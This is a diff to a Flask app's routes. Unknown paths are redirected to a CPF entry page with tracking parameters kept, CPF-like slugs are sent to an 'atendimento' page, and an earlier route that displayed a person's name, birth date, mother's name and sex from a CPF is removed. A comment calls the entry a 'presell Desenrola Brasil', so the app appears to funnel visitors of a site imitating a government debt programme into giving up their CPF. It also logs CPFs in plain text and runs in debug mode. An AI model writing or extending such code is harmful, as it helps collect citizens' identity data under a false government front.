@@ -51,13 +51,15 @@ def internal_error(error):
 
 @app.errorhandler(404)
 def not_found_error(error):
-    today_date = datetime.now().strftime('%d/%m/%Y')
-    default_data = {
-        'nome': 'USUÁRIO',
-        'cpf': '000.000.000-00',
-        'today_date': today_date
-    }
-    return render_template('index.html', customer=default_data, show_cpf_search=True), 404
+    # Se for arquivo estático ou asset ausente, retorna 404 padrão
+    path = request.path
+    if path.startswith('/static/') or any(path.endswith(ext) for ext in ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', '.webp', '.mp3', '.wav', '.map']):
+        return "Not Found", 404
+
+    qs = request.query_string.decode('utf-8')
+    target = f'/cpf?{qs}' if qs else '/cpf'
+    app.logger.warning(f"[404 FALLBACK] Redirecionando {request.path} para {target}")
+    return redirect(target, code=302)
 
 @app.route('/health')
 def health_check():
@@ -289,58 +291,6 @@ def index():
     # Entrada principal → presell Desenrola Brasil
     return redirect('/pre')
 
-@app.route('/<path:cpf>')
-def index_with_cpf(cpf):
-    try:
-        clean_cpf = re.sub(r'[^0-9]', '', cpf)
-        
-        if len(clean_cpf) != 11:
-            app.logger.error(f"[PROD] CPF inválido: {cpf}")
-            today_date = datetime.now().strftime('%d/%m/%Y')
-            default_data = {
-                'nome': 'USUÁRIO',
-                'cpf': '000.000.000-00',
-                'today_date': today_date
-            }
-            return render_template('index.html', customer=default_data, show_cpf_search=True)
-        
-        cpf_data = get_cpf_data(clean_cpf)
-        
-        if cpf_data:
-            formatted_cpf = f"{clean_cpf[:3]}.{clean_cpf[3:6]}.{clean_cpf[6:9]}-{clean_cpf[9:]}"
-            today = datetime.now().strftime("%d/%m/%Y")
-            
-            customer_data = {
-                'nome': cpf_data.get('nome', 'USUÁRIO'),
-                'cpf': formatted_cpf,
-                'data_nascimento': cpf_data.get('data_nascimento', ''),
-                'nome_mae': cpf_data.get('mae', ''),
-                'sexo': cpf_data.get('sexo', ''),
-                'phone': '',
-                'today_date': today
-            }
-            
-            session['customer_data'] = customer_data
-            app.logger.info(f"[PROD] Dados encontrados para CPF: {formatted_cpf}")
-            return render_template('index.html', customer=customer_data, show_confirmation=True, save_to_localStorage=True)
-        else:
-            app.logger.error(f"[PROD] Dados não encontrados para CPF: {cpf}")
-            today_date = datetime.now().strftime('%d/%m/%Y')
-            default_data = {
-                'nome': 'USUÁRIO',
-                'cpf': '000.000.000-00',
-                'today_date': today_date
-            }
-            return render_template('index.html', customer=default_data, show_cpf_search=True)
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro inesperado na rota CPF: {e}", exc_info=True)
-        today_date = datetime.now().strftime('%d/%m/%Y')
-        default_data = {
-            'nome': 'USUÁRIO',
-            'cpf': '000.000.000-00',
-            'today_date': today_date
-        }
-        return render_template('index.html', customer=default_data, show_cpf_search=True)
 
 @app.route('/atendimento')
 def atendimento():
@@ -1030,5 +980,33 @@ def legacy_webhook():
     """Compatibilidade para webhooks legados"""
     return jsonify({'success': True, 'received': True}), 200
 
+@app.route('/<path:slug>')
+def catch_all_or_cpf(slug):
+    """
+    Fallback para qualquer slug ou caminho aleatório:
+    - Se for recurso estático inexistente, retorna 404
+    - Se for CPF de 11 dígitos, redireciona para /atendimento com o CPF
+    - Para qualquer outra slug/erro de redirecionamento, redireciona para /cpf mantendo query string/UTMs
+    """
+    if slug.startswith('static/') or any(slug.endswith(ext) for ext in ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', '.webp', '.mp3', '.wav', '.map']):
+        return "Not Found", 404
+
+    clean_digits = re.sub(r'[^0-9]', '', slug)
+    qs = request.query_string.decode('utf-8')
+
+    # Caso a URL passe um CPF de 11 dígitos na slug
+    if len(clean_digits) == 11 and len(slug.replace('.', '').replace('-', '').strip()) == 11:
+        app.logger.info(f"[PROD] CPF recebido na slug: {clean_digits} -> redirecionando para atendimento")
+        params = f'cpf={clean_digits}'
+        if qs:
+            params += f'&{qs}'
+        return redirect(f'/atendimento?{params}', code=302)
+
+    # Redireciona qualquer slug aleatória para a página principal de inserção de CPF (/cpf)
+    app.logger.warning(f"[SLUG ALEATORIA] Slug '{slug}' redirecionada para /cpf mantendo tracking")
+    target = f'/cpf?{qs}' if qs else '/cpf'
+    return redirect(target, code=302)
+
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
+
